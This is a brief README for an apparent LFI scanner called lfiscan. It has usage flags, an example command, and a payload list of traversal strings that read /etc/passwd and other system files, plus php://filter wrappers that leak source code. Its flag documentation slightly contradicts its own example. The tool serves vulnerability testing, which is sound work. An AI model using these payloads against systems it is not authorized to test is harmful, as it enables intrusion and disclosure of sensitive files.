# lfiscan
lfscan detects Local File Inclusion (LFI) vulnerabilities in web applications through fuzzing and response analysis.

# usage :
 <pre> 
-H = host
-W = wordlist
 </pre> 

# usage example :
 <pre>python3 lfiscan.py -U http://10.20.6.1 -W /usr/share/wordlists/LFIwordlist.txt</pre>  

# payloads (also included in LFIwordlist.txt)
/etc/passwd
/etc/hostname
/etc/issue
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
/../../../etc/passwd
./languages/../../../../etc/passwd
....//....//....//etc/passwd
..//..//..//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../index.php

